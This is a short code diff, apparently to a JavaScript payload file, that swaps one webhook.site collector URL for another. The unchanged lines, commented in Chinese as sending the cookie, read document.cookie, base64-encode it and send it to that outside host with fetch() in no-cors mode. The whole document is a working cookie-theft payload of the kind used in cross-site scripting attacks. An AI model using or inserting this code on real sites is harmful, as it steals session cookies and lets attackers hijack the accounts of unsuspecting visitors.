@@ -1,4 +1,4 @@
-var webhook = "https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863?";
+var webhook = "https://webhook.site/4d5c5aed-b420-44a8-9a20-d976e811ca3e?";
 
 // 发送 Cookie
 fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });
